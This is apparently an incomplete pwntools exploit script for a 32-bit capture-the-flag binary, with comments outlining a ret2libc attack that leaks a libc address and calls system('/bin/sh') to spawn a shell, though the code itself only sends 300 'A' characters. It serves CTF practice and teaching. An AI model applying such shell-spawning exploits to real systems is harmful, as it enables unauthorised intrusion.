#!/usr/bin/env python

from pwn import *

local = True
debug = True


addr_unpacker = make_unpacker(32, endian='little', sign='unsigned')

libc = (ELF('/lib/i386-linux-gnu/libc.so.6') if local else ELF('./libc.so.6'))
r = (process('./32_chal') if local else remote('163.172.176.29', 9036))

if debug:
    gdb.attach(r, '''
set follow-fork-mode child
break *0x080484D8
continue''')




'''

-------------------------------------------------------------------------------

steps:

1.) payload1: leak libc address
2.) relocate libc / offset correction
    -> leaked_printf_addr = addr_unpacker(r.recv(4))
    -> libc.address = leaked_printf_addr - libc.symbols['printf']
3.) payload2: ret2libc system("/bin/sh")
    -> system @ libc.symbols['system']
    -> "/bin/sh" @ next(libc.search('/bin/sh\x00'))

-------------------------------------------------------------------------------

important pwntools communcation functions:

- r.send() : send bytes
- r.recv() : recv bytes
- r.recvline() : recieve until \n
- r.sendline() : send data with \n at the end
- r.interactive() : allows the users to open an interactive session

-------------------------------------------------------------------------------

important pwntools converters:
- p32() : converts a integer into 4-bytes lsb

-------------------------------------------------------------------------------

'''


payload = 'A' * 300

r.sendline(payload)
r.interactive()
